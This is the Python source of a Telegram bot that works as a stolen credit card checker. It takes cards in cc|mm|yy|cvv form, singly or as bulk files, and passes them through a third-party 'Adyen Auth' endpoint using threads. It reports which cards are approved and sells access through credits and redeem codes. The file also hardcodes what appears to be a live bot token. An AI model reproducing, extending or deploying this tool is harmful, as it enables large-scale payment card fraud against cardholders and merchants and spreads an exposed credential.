import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import re
import datetime
import threading
import random
import string
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import sys

# Bot Configuration
TOKEN = "8582998840:AAHd0RNL5L-SwT6DyYZNqR_Yf3z-6uTvr3k"
OWNER_ID = 7904483885
API_URL = "https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc={}"
BIN_API = "https://lookup.binlist.net/{}"

# Threading Configuration
MAX_WORKERS = 4  # 3 threads at a time
API_TIMEOUT = 120  # 120 seconds timeout

bot = telebot.TeleBot(TOKEN)

# File-based storage
DATA_FILE = "users_data.json"
REDEEM_FILE = "redeem_codes.json"

# Load data
def load_data():
    global users_data, redeem_codes
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                users_data = json.load(f)
                users_data = {int(k): v for k, v in users_data.items()}
        else:
            users_data = {}
    except:
        users_data = {}
    
    try:
        if os.path.exists(REDEEM_FILE):
            with open(REDEEM_FILE, 'r') as f:
                redeem_codes = json.load(f)
        else:
            redeem_codes = {}
    except:
        redeem_codes = {}

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({str(k): v for k, v in users_data.items()}, f)
    except:
        pass
    try:
        with open(REDEEM_FILE, 'w') as f:
            json.dump(redeem_codes, f)
    except:
        pass

load_data()

# Processing flags for mass check
processing_flags = {}
active_mass_checks = {}  # Track active mass checks per user

# ==================== HELPER FUNCTIONS ====================

def fancy_text(text):
    """Convert text to fancy font"""
    fancy_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
    }
    result = ""
    for char in text:
        result += fancy_map.get(char, char)
    return result

def get_user_mention(user):
    """Get clickable user mention"""
    name = user.first_name
    if user.username:
        return f"<a href='https://t.me/{user.username}'>{fancy_text(name)}</a>"
    else:
        return f"<a href='tg://user?id={user.id}'>{fancy_text(name)}</a>"

def get_user_credits(user_id):
    """Get user credits"""
    if user_id == OWNER_ID:
        return float('inf')
    
    user = users_data.get(user_id, {})
    
    if user.get('unlimited', False):
        if user.get('unlimited_until'):
            try:
                expiry = datetime.datetime.fromisoformat(user['unlimited_until'])
                if datetime.datetime.now() > expiry:
                    user['unlimited'] = False
                    user['unlimited_until'] = None
                    save_data()
                else:
                    return float('inf')
            except:
                return float('inf')
        else:
            return float('inf')
    
    return user.get('credits', 250)

def deduct_credits(user_id, amount=1):
    """Deduct credits from user"""
    if user_id == OWNER_ID:
        return True
    
    user = users_data.get(user_id, {})
    
    if user.get('unlimited', False):
        if user.get('unlimited_until'):
            try:
                expiry = datetime.datetime.fromisoformat(user['unlimited_until'])
                if datetime.datetime.now() > expiry:
                    user['unlimited'] = False
                    user['unlimited_until'] = None
                else:
                    return True
            except:
                return True
        else:
            return True
    
    credits = user.get('credits', 250)
    if credits >= amount:
        user['credits'] = credits - amount
        users_data[user_id] = user
        save_data()
        return True
    return False

def generate_redeem_code():
    """Generate redeem code"""
    part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"TOENV-{part1}-{part2}"

def get_bin_info(bin_number):
    """Get BIN information from API"""
    try:
        bin_6 = bin_number[:6]
        response = requests.get(BIN_API.format(bin_6), headers={'Accept-Version': '3'}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A').upper(),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '🌍')
            }
    except:
        pass
    return {
        'brand': 'N/A',
        'type': 'N/A',
        'bank': 'N/A',
        'country': 'N/A',
        'emoji': '💳'
    }

def check_cc_via_api(cc_data):
    """Check CC via API with 120 second timeout"""
    try:
        url = API_URL.format(cc_data)
        response = requests.get(url, timeout=API_TIMEOUT)
        return response.json()
    except requests.exceptions.Timeout:
        return {"error": "Timeout", "response": f"API Timeout ({API_TIMEOUT}s)", "status": "error"}
    except requests.exceptions.ConnectionError:
        return {"error": "Connection", "response": "Connection Failed", "status": "error"}
    except Exception as e:
        return {"error": "Error", "response": f"Failed: {str(e)[:50]}", "status": "error"}

# Thread worker for mass check
def check_cc_worker(cc_data, results_dict, key):
    """Worker function for threading"""
    result = check_cc_via_api(cc_data)
    results_dict[key] = result
    return cc_data, result

# ==================== START COMMAND ====================

@bot.message_handler(commands=['start', '.start'])
def send_welcome(message):
    user = message.from_user
    user_id = user.id
    
    if user_id not in users_data:
        users_data[user_id] = {'credits': 250, 'registered': True}
        save_data()
    
    user_mention = get_user_mention(user)
    credits = get_user_credits(user_id)
    credits_display = "♾️ Unlimited" if credits == float('inf') else f"💰 {int(credits)} Credits"
    
    welcome_text = f"""
⌬ @ToenvBot | By @Toenv
━━━━━━━━━━━━━━━━━━━━
Upgrading...
━━━━━━━━━━━━━━━━━━━━

✅️ Hello {user_mention}!
How Are You?

👤 {fancy_text('Your UserID')} - <code>{user_id}</code>
{credits_display}

━━━━━━━━━━━━━━━━━━━━
<blockquote>Status - Live!!!</blockquote>
━━━━━━━━━━━━━━━━━━━━
"""
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("🌐 Gateway", callback_data="gateway")
    btn2 = InlineKeyboardButton("👤 Profile", callback_data="profile")
    btn3 = InlineKeyboardButton("📢 Channel", url="https://t.me/Toenv")
    btn4 = InlineKeyboardButton("💳 BIN Lookup", callback_data="bin_lookup")
    markup.add(btn1, btn2, btn3, btn4)
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='HTML',
        reply_markup=markup
    )

# ==================== CALLBACK HANDLERS ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    
    if call.data == "gateway":
        gateway_text = f"""
{fancy_text('Adyen Auth Command')}
━━━━━━━━━━━━━━━━━━━━━

【✘】{fancy_text('Gateway')}: Adyen Auth
【✘】{fancy_text('Single Format')}: <code>/ady cc|mm|yy|cvv</code>
【✘】{fancy_text('Mass Format')}: <code>/mady</code> (reply to text file)
【✘】{fancy_text('Threads')}: 3 concurrent checks
【✘】{fancy_text('Timeout')}: 120 seconds

【✘】{fancy_text('Status')}: 🟢 Live
【✘】{fancy_text('Command')}: <code>/ady</code>
【✘】{fancy_text('Mass CMD')}: <code>/mady</code>
━━━━━━━━━━━━━━━━━━━━━

📝 {fancy_text('Example')}:
<code>/ady 4111111111111111|12|25|123</code>
"""
        bot.send_message(call.message.chat.id, gateway_text, parse_mode='HTML')
    
    elif call.data == "profile":
        user = call.from_user
        credits = get_user_credits(user_id)
        credits_display = "♾️ Unlimited" if credits == float('inf') else f"{int(credits)} Credits"
        
        unlimited_info = ""
        if users_data.get(user_id, {}).get('unlimited_until'):
            try:
                expiry = datetime.datetime.fromisoformat(users_data[user_id]['unlimited_until'])
                days_left = (expiry - datetime.datetime.now()).days
                if days_left > 0:
                    unlimited_info = f"\n⏳ {fancy_text('Expires')}: {days_left} days"
            except:
                pass
        
        profile_text = f"""
{fancy_text('Your Profile')}
━━━━━━━━━━━━━━━━
{fancy_text('Name')}: {get_user_mention(user)}
{fancy_text('User ID')}: <code>{user_id}</code>
{fancy_text('Username')}: @{user.username if user.username else 'None'}
{fancy_text('Credits')}: {credits_display}{unlimited_info}
━━━━━━━━━━━━━━━━
"""
        bot.send_message(call.message.chat.id, profile_text, parse_mode='HTML')
    
    elif call.data == "bin_lookup":
        bot.send_message(
            call.message.chat.id,
            f"🔍 {fancy_text('BIN Lookup')}\n\n"
            f"Use: <code>/bin 123456</code>\n"
            f"Example: <code>/bin 411111</code>",
            parse_mode='HTML'
        )
    
    elif call.data.startswith("stop_"):
        chat_id = call.message.chat.id
        user_id = call.from_user.id
        processing_flags[chat_id] = True
        if user_id in active_mass_checks:
            active_mass_checks[user_id] = False
        bot.answer_callback_query(call.id, "⏹️ Stopping process...")

# ==================== BIN LOOKUP COMMAND ====================

@bot.message_handler(commands=['bin', '.bin'])
def bin_lookup(message):
    try:
        bin_num = message.text.split()[1].strip()
        bin_num = re.sub(r'\D', '', bin_num)[:6]
        
        if len(bin_num) < 6:
            bot.reply_to(message, f"❌ {fancy_text('Invalid BIN. Use 6 digits')}")
            return
        
        msg = bot.reply_to(message, f"🔍 {fancy_text('Looking up BIN')}: {bin_num}...")
        
        info = get_bin_info(bin_num)
        
        result = f"""
📊 {fancy_text('BIN Information')}
━━━━━━━━━━━━━━━━
🔢 {fancy_text('BIN')}: <code>{bin_num}</code>
💳 {fancy_text('Brand')}: {info['brand']}
📋 {fancy_text('Type')}: {info['type']}
🏦 {fancy_text('Bank')}: {info['bank']}
🌍 {fancy_text('Country')}: {info['country']} {info['emoji']}
━━━━━━━━━━━━━━━━
"""
        bot.edit_message_text(result, msg.chat.id, msg.message_id, parse_mode='HTML')
        
    except IndexError:
        bot.reply_to(message, f"❌ {fancy_text('Use')}: /bin 123456")
    except Exception as e:
        bot.reply_to(message, f"❌ {fancy_text('Error')}: {str(e)}")

# ==================== SINGLE CHECK ====================

@bot.message_handler(commands=['ady', '.ady'])
def check_single(message):
    user_id = message.from_user.id
    user = message.from_user
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits == 0:
        bot.reply_to(message, f"❌ {fancy_text('Credit Ran Out!')}\nContact: @Lost_yashika")
        return
    
    # Parse command
    try:
        data = message.text.replace('/ady', '').replace('.ady', '').strip()
        if '|' not in data:
            bot.reply_to(message, f"❌ {fancy_text('Use')}: /ady cc|mm|yy|cvv")
            return
        
        parts = data.split('|')
        if len(parts) != 4:
            bot.reply_to(message, f"❌ {fancy_text('Invalid Format')}")
            return
        
        cc, mm, yy, cvv = parts
        cc = re.sub(r'\D', '', cc)
        mm = re.sub(r'\D', '', mm).zfill(2)
        yy = re.sub(r'\D', '', yy)
        cvv = re.sub(r'\D', '', cvv)
        
        if len(cc) not in [15, 16]:
            bot.reply_to(message, f"❌ {fancy_text('Invalid Card Length')}")
            return
        
        # Format year
        if len(yy) == 2:
            yy = '20' + yy
        elif len(yy) == 4:
            pass
        else:
            bot.reply_to(message, f"❌ {fancy_text('Invalid Year')}")
            return
        
        # Get BIN info
        bin_info = get_bin_info(cc)
        
        # Deduct credit
        if not deduct_credits(user_id):
            bot.reply_to(message, f"❌ {fancy_text('Credit Ran Out!')}\nContact: @Lost_yashika")
            return
        
        # Process
        start_time = time.time()
        msg = bot.reply_to(message, f"⏳ {fancy_text('Processing...')} (Timeout: {API_TIMEOUT}s)")
        
        cc_data = f"{cc}|{mm}|{yy[-2:]}|{cvv}"
        result = check_cc_via_api(cc_data)
        
        elapsed = time.time() - start_time
        
        # Parse response
        if "error" in result:
            if result.get('error') == 'Timeout':
                status = f"{fancy_text('Timeout')} ⏰"
            else:
                status = f"{fancy_text('Declined')} ❌"
            response_text = result.get('response', 'Error')
        else:
            # Check response status
            resp_str = str(result).lower()
            if 'approved' in resp_str or 'success' in resp_str or result.get('status', '').lower() == 'approved':
                status = f"{fancy_text('Approved')} ✅"
            else:
                status = f"{fancy_text('Declined')} ❌"
            response_text = result.get('response', result.get('message', 'Processed'))
        
        result_text = f"""
{status}

{fancy_text('Card')}: <code>{cc}|{mm}|{yy[-2:]}|{cvv}</code>
{fancy_text('Gateway')}: Adyen Auth [/ady]
{fancy_text('Response')}: {response_text}

{fancy_text('BIN Info')}:
💳 {fancy_text('Brand')}: {bin_info['brand']}
📋 {fancy_text('Type')}: {bin_info['type']}
🏦 {fancy_text('Bank')}: {bin_info['bank']}
🌍 {fancy_text('Country')}: {bin_info['country']} {bin_info['emoji']}

{fancy_text('Time')}: {elapsed:.2f} {fancy_text('s')}
{fancy_text('Checked By')}: {get_user_mention(user)}
"""
        
        bot.edit_message_text(result_text, msg.chat.id, msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ {fancy_text('Error')}: {str(e)}")

# ==================== MASS CHECK WITH THREADING ====================

@bot.message_handler(commands=['mady', '.mady'])
def check_mass(message):
    user_id = message.from_user.id
    user = message.from_user
    chat_id = message.chat.id
    start_time = time.time()
    
    # Check if user already has active mass check
    if user_id in active_mass_checks and active_mass_checks[user_id]:
        bot.reply_to(message, f"⏳ {fancy_text('You already have a mass check running')}!")
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits == 0:
        bot.reply_to(message, f"❌ {fancy_text('Credit Ran Out!')}\nContact: @Lost_yashika")
        return
    
    # Check file
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, f"❌ {fancy_text('Reply to a text file')}!")
        return
    
    try:
        # Download file
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        lines = file_content.strip().split('\n')
        
        # Parse valid CCs
        valid_ccs = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cc, mm, yy, cvv = parts
                    cc = re.sub(r'\D', '', cc)
                    mm = re.sub(r'\D', '', mm).zfill(2)
                    yy = re.sub(r'\D', '', yy)
                    cvv = re.sub(r'\D', '', cvv)
                    
                    # Format year
                    if len(yy) == 2:
                        yy = '20' + yy
                    
                    if len(cc) in [15, 16] and len(mm) == 2 and len(yy) in [4] and len(cvv) in [3,4]:
                        valid_ccs.append(f"{cc}|{mm}|{yy[-2:]}|{cvv}")
        
        if not valid_ccs:
            bot.reply_to(message, f"❌ {fancy_text('No valid CCs')}!")
            return
        
        # Check limit
        available = get_user_credits(user_id)
        if available == float('inf'):
            check_limit = len(valid_ccs)
        else:
            check_limit = min(int(available), len(valid_ccs))
        
        if check_limit == 0:
            bot.reply_to(message, f"❌ {fancy_text('No credits')}!\nContact: @Lost_yashika")
            return
        
        # Initialize
        processing_flags[chat_id] = False
        active_mass_checks[user_id] = True
        results = {
            'approved': [],
            'declined': [],
            'errors': [],
            'timeout': []
        }
        
        # Initial message
        total = check_limit
        msg = bot.send_message(chat_id, 
            f"```\n⌬ [/ady] Adyen Auth\n```\n"
            f"⌬ {fancy_text('Gateway')}: Adyen Auth\n"
            f"⌬ {fancy_text('Cards')}: {total}\n"
            f"⌬ {fancy_text('Threads')}: {MAX_WORKERS}\n"
            f"⌬ {fancy_text('Status')}: Processing...",
            parse_mode='HTML'
        )
        
        # Process cards with thread pool
        cards_to_check = valid_ccs[:check_limit]
        completed = 0
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # Submit all tasks
            future_to_card = {
                executor.submit(check_cc_via_api, card): card 
                for card in cards_to_check
            }
            
            for future in as_completed(future_to_card):
                if processing_flags.get(chat_id, False):
                    # Stop requested
                    for f in future_to_card:
                        f.cancel()
                    break
                
                card = future_to_card[future]
                completed += 1
                
                try:
                    result = future.result(timeout=API_TIMEOUT+5)
                    
                    # Deduct credit
                    deduct_credits(user_id)
                    
                    # Categorize
                    if "error" in result:
                        if result.get('error') == 'Timeout':
                            results['timeout'].append(card)
                        else:
                            results['errors'].append(card)
                    else:
                        resp_str = str(result).lower()
                        if 'approved' in resp_str or 'success' in resp_str or result.get('status', '').lower() == 'approved':
                            results['approved'].append(card)
                        else:
                            results['declined'].append(card)
                    
                except Exception as e:
                    results['errors'].append(card)
                
                # Update progress every 5 cards or at completion
                if completed % 5 == 0 or completed == total:
                    try:
                        status_text = (
                            f"```\n⌬ [/ady] Adyen Auth\n```\n"
                            f"⌬ {fancy_text('Gateway')}: Adyen Auth\n"
                            f"⌬ {fancy_text('Cards')}: {total}\n"
                            f"⌬ {fancy_text('Threads')}: {MAX_WORKERS}\n"
                            f"⌬ {fancy_text('Status')}: Processing...\n\n"
                            f"{fancy_text('Progress')}: {completed}/{total}\n"
                            f"{fancy_text('Checking')}: <code>{card}</code>\n"
                            f"{fancy_text('Approved')}: {len(results['approved'])}\n"
                            f"{fancy_text('Declined')}: {len(results['declined'])}\n"
                            f"{fancy_text('Timeout')}: {len(results['timeout'])}\n"
                            f"{fancy_text('Error')}: {len(results['errors'])}"
                        )
                        
                        markup = InlineKeyboardMarkup()
                        markup.add(InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_{chat_id}"))
                        
                        bot.edit_message_text(
                            status_text, 
                            chat_id, 
                            msg.message_id, 
                            parse_mode='HTML', 
                            reply_markup=markup
                        )
                    except:
                        pass
        
        # Final result
        active_mass_checks[user_id] = False
        total_time = time.time() - start_time
        
        # Prepare result text
        result_text = (
            f"```\n⌬ [/ady] Adyen Auth\n```\n"
            f"⌬ {fancy_text('Gateway')}: Adyen Auth\n"
            f"⌬ {fancy_text('Status')}: Completed\n"
            f"⌬ {fancy_text('T/t')}: {total_time:.2f} {fancy_text('s')}\n"
            f"⌬ {fancy_text('Total')}: {total}\n"
            f"⌬ {fancy_text('Threads')}: {MAX_WORKERS}\n\n"
            f"✅ {fancy_text('Approved')}: {len(results['approved'])}\n"
            f"❌ {fancy_text('Declined')}: {len(results['declined'])}\n"
            f"⏰ {fancy_text('Timeout')}: {len(results['timeout'])}\n"
            f"⚠️ {fancy_text('Errors')}: {len(results['errors'])}\n\n"
        )
        
        # Add approved cards if any
        if results['approved']:
            approved_list = '\n'.join([f"✅ {card}" for card in results['approved'][:10]])
            if len(results['approved']) > 10:
                approved_list += f"\n... and {len(results['approved'])-10} more"
            result_text += f"{fancy_text('Approved Cards')}:\n{approved_list}\n\n"
        
        result_text += f"⌬ {fancy_text('Checked By')}: {get_user_mention(user)}"
        
        try:
            bot.edit_message_text(result_text, chat_id, msg.message_id, parse_mode='HTML')
        except:
            bot.send_message(chat_id, result_text, parse_mode='HTML')
        
        # Send full approved list if many
        if len(results['approved']) > 10:
            full_list = '\n'.join([f"✅ {card}" for card in results['approved']])
            for i in range(0, len(full_list), 4000):
                bot.send_message(chat_id, f"{fancy_text('All Approved')}:\n{full_list[i:i+4000]}")
        
    except Exception as e:
        active_mass_checks[user_id] = False
        bot.reply_to(message, f"❌ {fancy_text('Error')}: {str(e)}")

# ==================== OWNER COMMANDS ====================

@bot.message_handler(commands=['stats', '.stats'])
def stats_cmd(message):
    if message.from_user.id != OWNER_ID:
        return
    
    total = len(users_data)
    total_credits = sum(u.get('credits', 0) for u in users_data.values() if not u.get('unlimited'))
    unlimited = sum(1 for u in users_data.values() if u.get('unlimited'))
    
    bot.reply_to(message, 
        f"📊 {fancy_text('Bot Statistics')}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"👥 {fancy_text('Total Users')}: {total}\n"
        f"💰 {fancy_text('Total Credits')}: {total_credits}\n"
        f"♾️ {fancy_text('Unlimited Users')}: {unlimited}\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['key', '.key'])
def key_cmd(message):
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Use: /key <credits> [days]")
            return
        
        credits = int(parts[1])
        days = int(parts[2]) if len(parts) > 2 else None
        
        code = generate_redeem_code()
        if days:
            redeem_codes[code] = {'credits': credits, 'days': days}
            value_text = f"{credits} credits ({days} days unlimited)"
        else:
            redeem_codes[code] = {'credits': credits, 'days': None}
            value_text = f"{credits} credits"
        
        save_data()
        
        bot.reply_to(message, 
            f"✅ {fancy_text('Code Generated')}\n"
            f"Code: <code>{code}</code>\n"
            f"Value: {value_text}",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unlimited', '.unlimited'])
def unlimited_cmd(message):
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "❌ Use: /unlimited user_id days")
            return
        
        user_id = int(parts[1])
        days = int(parts[2])
        
        if user_id not in users_data:
            users_data[user_id] = {'credits': 250}
        
        users_data[user_id]['unlimited'] = True
        users_data[user_id]['unlimited_until'] = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
        save_data()
        
        bot.reply_to(message, f"✅ Unlimited for {user_id} for {days} days")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['reset', '.reset'])
def reset_cmd(message):
    if message.from_user.id != OWNER_ID:
        return
    
    try:
        user_id = int(message.text.split()[1])
        if user_id in users_data:
            users_data[user_id]['credits'] = 250
            users_data[user_id]['unlimited'] = False
            users_data[user_id]['unlimited_until'] = None
            save_data()
            bot.reply_to(message, f"✅ Reset for {user_id}")
        else:
            bot.reply_to(message, "❌ User not found")
    except Exception as e:
        bot.reply_to(message, "❌ Use: /reset user_id")

@bot.message_handler(commands=['redeem', '.redeem'])
def redeem_cmd(message):
    user_id = message.from_user.id
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, f"❌ {fancy_text('Use')}: /redeem TOENV-XXXX-XXXX")
            return
        
        code = parts[1].upper()
        if code not in redeem_codes:
            bot.reply_to(message, f"❌ {fancy_text('Invalid code')}")
            return
        
        data = redeem_codes[code]
        
        if user_id not in users_data:
            users_data[user_id] = {'credits': 250}
        
        if data['days']:
            users_data[user_id]['unlimited'] = True
            users_data[user_id]['unlimited_until'] = (datetime.datetime.now() + datetime.timedelta(days=data['days'])).isoformat()
            bot.reply_to(message, f"✅ {fancy_text('Redeemed')}!\n{data['days']} days unlimited activated!")
        else:
            users_data[user_id]['credits'] = users_data[user_id].get('credits', 0) + data['credits']
            bot.reply_to(message, f"✅ {fancy_text('Redeemed')}!\n{data['credits']} credits added!")
        
        del redeem_codes[code]
        save_data()
        
    except Exception as e:
        bot.reply_to(message, f"❌ {fancy_text('Error')}: {str(e)}")

# ==================== BROADCAST ====================

@bot.message_handler(commands=['broadcast', '.broadcast'])
def broadcast_cmd(message):
    if message.from_user.id != OWNER_ID:
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "❌ Reply to a message to broadcast")
        return
    
    msg = message.reply_to_message.text or message.reply_to_message.caption
    if not msg:
        bot.reply_to(message, "❌ No text found")
        return
    
    markup = InlineKeyboardMarkup()
    btn1 = InlineKeyboardButton("✅ Confirm", callback_data="broadcast_confirm")
    btn2 = InlineKeyboardButton("❌ Cancel", callback_data="broadcast_cancel")
    markup.add(btn1, btn2)
    
    bot.reply_to(message, 
        f"📢 Broadcast to {len(users_data)} users?\n\n{msg[:100]}...",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data in ["broadcast_confirm", "broadcast_cancel"])
def broadcast_callback(call):
    if call.from_user.id != OWNER_ID:
        return
    
    if call.data == "broadcast_cancel":
        bot.edit_message_text("❌ Broadcast cancelled", call.message.chat.id, call.message.message_id)
        return
    
    msg = call.message.text.split('\n\n', 1)[1] if '\n\n' in call.message.text else "Broadcast"
    
    bot.edit_message_text("📢 Broadcasting...", call.message.chat.id, call.message.message_id)
    
    sent = 0
    failed = 0
    
    for user_id in users_data.keys():
        try:
            bot.send_message(user_id, msg)
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    bot.send_message(
        call.message.chat.id,
        f"✅ Broadcast complete!\nSent: {sent}\nFailed: {failed}"
    )

# ==================== MAIN ====================

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(0.5)
    bot.reply_to(message, 
        f"⚡ {fancy_text('Use /start')}\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML'
    )

# Auto-save thread
def auto_save():
    while True:
        time.sleep(60)
        save_data()

threading.Thread(target=auto_save, daemon=True).start()

print("🚀 Bot Started with Threading!")
print(f"Owner: {OWNER_ID}")
print(f"Max Workers: {MAX_WORKERS}")
print(f"API Timeout: {API_TIMEOUT}s")
print(f"Users: {len(users_data)}")
bot.infinity_polling()
